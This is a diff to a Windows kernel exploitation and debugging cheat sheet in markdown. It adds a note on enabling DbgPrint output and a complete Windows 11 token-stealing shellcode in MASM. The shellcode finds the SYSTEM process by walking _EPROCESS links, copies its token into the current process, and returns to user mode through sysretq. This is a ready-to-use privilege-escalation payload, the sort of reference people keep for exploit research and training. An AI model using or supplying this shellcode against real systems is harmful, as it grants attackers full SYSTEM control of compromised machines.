@@ -14,6 +14,7 @@
 	- [SMAP During Debugging](#smap-during-debugging)
 	- [Mona in WinDbg](#mona-in-windbg)
 	- [Conditional Breakpoints](#conditional-breakpoints)
+	- [Enable Debug Print](#enable-debug-print)
  - [Token Stealing Shellcode](#token-stealing-shellcode)
 
 ---
@@ -61,7 +62,7 @@ Disable-WindowsOptionalFeature -FeatureName "Windows-Defender-ApplicationGuard" 
 ```
 
 ## Creating low Integrity cmd
-- Creating cmd.exe with low integrity (here: from commmon cmd.exe, which runs by default as medium integrity)
+- Creating cmd.exe with low integrity (here: from common cmd.exe, which runs by default as medium integrity)
 - Same works for switching to high integrity, but this has to be done with elevated privileges: high > medium > low
 
 ```powershell
@@ -212,8 +213,24 @@ bp ntdll+31337 ".printf \"alloc(0x%x) = 0x%p from 0x%p \\n\", poi(rsp+50), rax, 
 ba e1 /p <process> example+1337 ".if ( qwo(@rcx+0x18) != 0x300 ) { dqs @rcx+0x18 L1; } .else { gc; }
 ```
 
+### Enable Debug Print
+- Enabling `DbgPrint` monitoring can be done either by `registry key` or in `WinDbg`
+
+```ps
+# WinDbg
+ed kd_default_mask 0xf
+
+# Registry
+- Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Debug Print Filter
+- Add DWORD
+  - Value name: Default
+  - Value data: 0xf
+```
+
+
 ## Token Stealing Shellcode
 - Simple token stealing shellcode (`masm` compatible)
+- Windows 10
 ```asm
 _TEXT	SEGMENT
     shellcode PROC
@@ -248,4 +265,45 @@ _TEXT	ENDS
 END
 ```
 
-
+- Windows 11 (adjusted `_EPROCESS`)
+```
+_TEXT	SEGMENT
+    shellcode PROC
+            mov rax, QWORD PTR gs:[0188h]
+            mov rax, QWORD PTR [rax + 0b8h]
+            nop
+            mov rbx, rax
+            nop
+        __LOOP:
+            mov rbx, QWORD PTR [rbx + 01d8h]
+            nop
+            sub rbx, 01d8h
+            nop
+            mov rcx, QWORD PTR [rbx + 01d0h]
+            nop
+            cmp rcx, 04h
+            nop
+            jnz __LOOP
+        __ADJUST:
+            ;int 3
+            mov rcx, QWORD PTR [rbx + 0248h]
+            and cl, 0f0h
+            mov QWORD PTR [rax + 0248h], rcx
+        __CLEANUP:
+            mov rax, QWORD PTR gs:[0188h]
+            mov cx, WORD PTR [rax + 01e4h]
+            inc cx
+            mov WORD PTR [rax + 01e4h], cx
+            mov rdx, QWORD PTR [rax + 090h]
+            mov rcx, QWORD PTR [rdx + 0168h]
+            mov r11, QWORD PTR [rdx + 0178h]
+            mov rsp, QWORD PTR [rdx + 0180h]
+            mov rbp, QWORD PTR [rdx + 0158h]
+            nop
+            xor eax, eax
+            swapgs
+            sysretq
+    shellcode ENDP
+_TEXT	ENDS
+END
+```
